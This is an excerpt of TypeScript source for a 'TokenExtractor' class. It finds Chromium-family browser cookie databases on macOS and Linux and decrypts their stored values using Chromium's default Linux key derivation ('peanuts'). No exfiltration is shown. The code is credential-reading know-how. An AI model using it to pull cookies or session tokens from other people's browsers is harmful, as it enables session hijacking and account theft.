...
export class TokenExtractor {
  ...
  findCookieDatabases(): string[] {
    const browserPaths =
      this.platform === "darwin"
        ...
        : this.platform === "linux"
          ? BROWSERS.map((browser) =>
              join(this.homeDirectory, ".config", browser.linuxPath, "Default", "Cookies"),
            )
          : [];
  ...
  private async decryptCookie(encryptedValue: Buffer, browserName: string): Promise<string> {
    ...
    if (this.platform === "linux") {
      return this.decryptChromiumValue(
        encryptedValue,
        pbkdf2Sync("peanuts", CHROMIUM_SALT, 1, 16, "sha1"),
      );
    }
  ...
  private decryptChromiumValue(encryptedValue: Buffer, key: Buffer): string {
    const encryptedPayload =
      encryptedValue.subarray(0, 3).toString("utf8") === "v10"
  ...
  private getBrowserByPath(databasePath: string): BrowserConfig | undefined {
    return BROWSERS.find(
      (browser) =>
        databasePath.includes(`${browser.macPath}/`) ||
        databasePath.includes(`${browser.linuxPath}/`),
    );
  }
}
